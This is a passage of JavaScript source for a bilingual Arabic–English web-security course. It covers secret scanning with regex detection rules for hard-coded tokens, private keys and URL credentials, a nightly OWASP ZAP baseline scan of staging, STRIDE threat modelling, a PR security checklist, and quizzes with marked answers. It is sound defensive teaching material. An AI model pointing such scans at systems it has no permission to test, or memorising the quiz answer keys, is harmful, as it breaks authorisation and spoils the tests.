          'const files = {\n  "src/config.js": `export const db = process.env.DATABASE_URL;\\nconst TELEGRAM_TOKEN = "example-not-a-real-token-123456";`,\n  "src/pay.js": `const key = "demo-public-key";  // public demo value`,\n  ".env.example": "ANTHROPIC_API_KEY=\\nDATABASE_URL=postgres://user:pass@localhost/shop",\n  "README.md": "Set ANTHROPIC_API_KEY in .env",\n};\nconst RULES = [\n  [/(token|secret|password|api_?key)\\s*[:=]\\s*["\'][^"\'\\s]{12,}["\']/i, "hard-coded secret"],\n  [/-----BEGIN (RSA |EC )?PRIVATE KEY-----/, "private key"],\n  [/:\\/\\/[^:\\s\\/]+:[^@\\s\\/]+@(?!localhost)/, "credentials in a URL"],\n];\nfor (const [file, text] of Object.entries(files))\n  text.split("\\n").forEach((line, i) => {\n    for (const [re, what] of RULES) if (re.test(line)) console.log(`${file}:${i + 1}  ${what}`);\n  });\nconsole.log("(.env.example with localhost placeholders is fine; real values live in a secret manager)");', N()),
        L(B('اختبار ديناميكي', 'Dynamic testing'),
          B('غير التحليل الساكن: **dast** = أداة بتهاجم تطبيقك الشغال (على staging) زي مهاجم حقيقي: OWASP **zap baseline** بيفحص الـ headers والـ cookies والـ XSS البسيط في دقايق. شغّله كل ليلة على staging، وامسح التحذيرات الكاذبة بقواعد مكتوبة.', 'Beyond static analysis: **dast** = a tool attacking your running app (on staging) like a real attacker: the OWASP **zap baseline** checks headers, cookies and simple XSS in minutes. Run it nightly against staging, and suppress false positives with written rules.'),
          '# nightly against staging (never against systems you don\'t own)\n- name: ZAP baseline scan\n  uses: zaproxy/action-baseline@v0.14.0\n  with:\n    target: https://staging.shop.example.com\n    rules_file_name: .zap/rules.tsv        # documented ignores: rule id + reason\n    fail_action: true\n\n# .zap/rules.tsv\n10038\tIGNORE\t(CSP: handled by nonce policy; report-only on /legacy until 2026-11)', T),
        L(B('نموذج تهديد ومراجعة', 'Threat model and review'),
          B('قبل ميزة مهمة: **threat model** سريع بـ **stride** (انتحال، تعديل، إنكار، تسريب، تعطيل، رفع صلاحيات) على رسم بسيط للبيانات. وفي كل PR فيه auth أو مدخلات أو فلوس: **security review** بقايمة. وصفحة **responsible disclosure** عشان اللي يلاقي ثغرة يبلّغك بدل ما ينشرها.', 'Before an important feature: a quick **threat model** with **stride** (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege) on a simple data-flow sketch. In every PR touching auth, input or money: a **security review** with a checklist. And a **responsible disclosure** page so whoever finds a flaw reports it to you instead of publishing it.'),
          'security review checklist (PR template)\n☐ input validated with a schema (no whole req.body to the DB)      ☐ output escaped per context / sanitised\n☐ authz checked on the server for every object (not just «logged in») ☐ no secrets in code, logs or errors\n☐ outbound URLs: allowlist / BlockList; redirects: safeNext           ☐ webhooks: raw-body signature + timestamp\n☐ new packages reviewed (name, maintainer, scripts)                    ☐ rate limits on new public endpoints\n\nSTRIDE for «import products from a supplier URL»\nS supplier spoofed → signed URLs   T file altered → hash check   R «we never imported that» → audit log\nI internal data via SSRF → BlockList   D 2 GB file → size limit + timeout   E admin-only action → role check', T)
      ],
      practice: [
        B('شغّل gitleaks (أو الفاحص) على ريبو عندك.', 'Run gitleaks (or the scanner) on one of your repos.'),
        B('شغّل ZAP baseline على staging بتاعك.', 'Run the ZAP baseline against your staging.'),
        B('اعمل STRIDE لميزة واحدة.', 'Do STRIDE for one feature.'),
        B('ضيف checklist الأمان لـ PR template.', 'Add the security checklist to the PR template.')
      ],
      words: [
        W('secret scanning', 'فحص الكود عن أسرار', 'searching code for leaked secrets', 'Secret scanning blocked the commit.'),
        W('dast', 'اختبار أمان على التطبيق الشغال', 'dynamic application security testing', 'DAST runs nightly on staging.'),
        W('zap baseline', 'فحص OWASP ZAP السريع', 'OWASP ZAP’s quick passive scan', 'The ZAP baseline flagged a missing header.'),
        W('threat model', 'تحليل التهديدات', 'an analysis of possible attacks', 'Write a threat model before the import feature.'),
        W('stride', 'إطار تصنيف التهديدات', 'a six-category threat framework', 'STRIDE found a repudiation gap.'),
        W('security review', 'مراجعة أمان', 'a security check of a change', 'Payments PRs need a security review.'),
        W('responsible disclosure', 'الإبلاغ المسؤول عن الثغرات', 'reporting flaws privately to the owner', 'Publish a responsible disclosure page.')
      ],
      read: [{ lib: 'OWASP Top 10', what: B('راجع A01 وA03 وA08 وA10.', 'Review A01, A03, A08 and A10.') }],
      challenge: B('حط الأمان في دورة التطوير: gitleaks في pre-commit وCI، ZAP baseline كل ليلة على staging بقواعد موثّقة، checklist أمان في PR template، STRIDE لأهم ميزتين، وsecurity.txt بصفحة responsible disclosure.', 'Put security into the development cycle: gitleaks in pre-commit and CI, a nightly ZAP baseline on staging with documented rules, a security checklist in the PR template, STRIDE for the two most important features, and a security.txt with a responsible-disclosure page.'),
      quiz: [
        Q(B('سر اتسرب في commit:', 'A secret leaked in a commit:'), [['غيّره فورًا', 'rotate it at once'], ['احذف السطر بس', 'just delete the line'], ['تجاهل', 'ignore it']], 0, B('التاريخ فاضل.', 'History remains.')),
        Q(B('ZAP baseline يتشغّل على:', 'The ZAP baseline runs against:'), [['staging بتاعك', 'your staging'], ['أي موقع', 'any website'], ['المنافسين', 'competitors']], 0, B('إذن.', 'Permission.')),
        Q(B('E في STRIDE:', 'The E in STRIDE:'), [['Elevation of privilege', 'Elevation of privilege'], ['Encryption', 'Encryption'], ['Email', 'Email']], 0, B('صلاحيات.', 'Privileges.'))
      ] },

    { title: B('مراجعة الأسبوع ومشروعه', 'Week review and project'),
      goal: B('تطبيقات JavaScript صعب اختراقها.', 'JavaScript apps that are hard to break.'),
      review: [
        B('XSS بالسياقات وDOMPurify وTrusted Types وCSP nonces.', 'XSS by context, DOMPurify, Trusted Types and CSP nonces.'),
        B('prototype pollution وmass assignment وNoSQL injection.', 'Prototype pollution, mass assignment and NoSQL injection.'),
        B('SSRF بـ BlockList والتحويلات والـ webhooks الواردة.', 'SSRF with BlockList, redirects and incoming webhooks.'),
        B('سلسلة توريد npm وSRI.', 'The npm supply chain and SRI.'),
        B('secret scanning وDAST وSTRIDE والمراجعة.', 'Secret scanning, DAST, STRIDE and review.')
      ],
      project: B('مشروع الأسبوع «مراجعة أمان كاملة» لتطبيق Express + واجهة عندك: هروب حسب السياق وDOMPurify وCSP بـ nonce وTrusted Types، إصلاح كل merge وreq.body واستعلام NoSQL، BlockList لكل fetch خارجي وsafeNext للتحويلات وwebhooks موقّعة، .npmrc وSRI وaudit في CI، gitleaks وZAP baseline وSTRIDE — مع تقرير بكل ثغرة لقيتها وإصلاحها واختبارها.', 'Week project «a complete security review» of one of your Express + front-end apps: context escaping, DOMPurify, a nonce CSP and Trusted Types; fixes for every merge, req.body and NoSQL query; a BlockList for every external fetch, safeNext for redirects and signed webhooks; .npmrc, SRI and audit in CI; gitleaks, a ZAP baseline and STRIDE — with a report of every flaw found, its fix and its test.'),
      test: [
        Q(B('DOM-based XSS:', 'DOM-based XSS:'), [['كود الصفحة بيحط مدخل في innerHTML', 'page code puts input into innerHTML'], ['من القاعدة بس', 'only from the database'], ['من CSS', 'from CSS']], 0, B('عميل.', 'Client-side.')),
        Q(B('escape لقيمة جوه attribute:', 'Escaping a value inside an attribute:'), [['escape يشمل علامات التنصيص', 'escaping that covers quotes'], ['مش محتاج', 'not needed'], ['encodeURI بس', 'only encodeURI']], 0, B('سياق.', 'Context.')),
        Q(B('Trusted Types:', 'Trusted Types:'), [['innerHTML بيرفض strings مش معدّية على policy', 'innerHTML rejects strings not from a policy'], ['نوع بيانات جديد', 'a new data type'], ['تشفير', 'encryption']], 0, B('DOM XSS.', 'DOM XSS.')),
        Q(B('nonce في CSP:', 'A nonce in CSP:'), [['جديد لكل طلب', 'new for each request'], ['ثابت للأبد', 'fixed forever'], ['في الـ URL', 'in the URL']], 0, B('عشوائي.', 'Random.')),
        Q(B('Object.create(null):', 'Object.create(null):'), [['كائن من غير prototype', 'an object without a prototype'], ['null', 'null'], ['خطأ', 'an error']], 0, B('pollution.', 'Pollution.')),
        Q(B('تحديث بروفايل:', 'A profile update:'), [['allowlist للحقول', 'an allowlist of fields'], ['req.body كله', 'all of req.body'], ['أي حقل', 'any field']], 0, B('mass assignment.', 'Mass assignment.')),
        Q(B('vm module:', 'The vm module:'), [['مش sandbox أمان', 'not a security sandbox'], ['sandbox آمن', 'a safe sandbox'], ['قاعدة بيانات', 'a database']], 0, B('حذر.', 'Caution.')),
        Q(B('DNS rebinding بيتمنع بـ:', 'DNS rebinding is prevented by:'), [['فحص الـ IP المحلول قبل الاتصال', 'checking the resolved IP before connecting'], ['https بس', 'https only'], ['cookies', 'cookies']], 0, B('IP.', 'IP.')),
        Q(B('توقيع webhook على:', 'A webhook signature covers:'), [['الـ body الخام', 'the raw body'], ['JSON بعد parse', 'the parsed JSON'], ['الـ URL بس', 'only the URL']], 0, B('خام.', 'Raw.')),
        Q(B('expres بدل express:', 'expres instead of express:'), [['typosquatting', 'typosquatting'], ['نسخة خفيفة', 'a lite version'], ['رسمي', 'official']], 0, B('اسم.', 'Name.')),
        Q(B('SRI:', 'SRI:'), [['المتصفح يرفض ملف اتغيّر', 'the browser refuses a changed file'], ['ضغط', 'compression'], ['تسريع', 'acceleration']], 0, B('hash.', 'Hash.')),
        Q(B('DAST:', 'DAST:'), [['اختبار التطبيق الشغال', 'testing the running app'], ['قراءة الكود', 'reading code'], ['تصميم', 'design']], 0, B('ديناميكي.', 'Dynamic.'))
      ] }
  ]
};
